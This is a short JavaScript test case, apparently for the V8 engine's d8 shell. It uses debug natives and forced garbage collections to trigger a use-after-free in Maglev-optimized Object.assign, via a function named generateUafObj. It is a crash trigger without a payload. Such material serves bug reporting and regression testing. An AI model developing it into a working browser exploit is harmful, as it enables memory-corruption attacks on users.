print("main begin");
let o1 = { f: 0 };
print("assign 1");
let from = {};
from.f = from;
Object.assign({}, from);
gc({ type: "major" });
print("prepare fin");
gc({ type: "minor" });
let mark_obj = {};
o1.f = mark_obj;
const v24 = %DebugPrint(o1);
for (let i26 = 0; i26 < 70; i26++) {
    print(i26);
    o1[i26] = {};
}
print("write barrier trigger finish");
for (let i37 = 0; i37 < 1; i37++) {
    print(i37);
    new Array(16384);
}
function generateUafObj(a48) {
    let uaf = {};
    uaf.f = uaf;
    Object.assign(a48, uaf);
}
const v52 = %PrepareFunctionForOptimization(generateUafObj);
generateUafObj({});
const v55 = %OptimizeMaglevOnNextCall(generateUafObj);
generateUafObj(mark_obj);
gc({ type: "major" });
print("main fin =========");
const v62 = %SystemBreak();
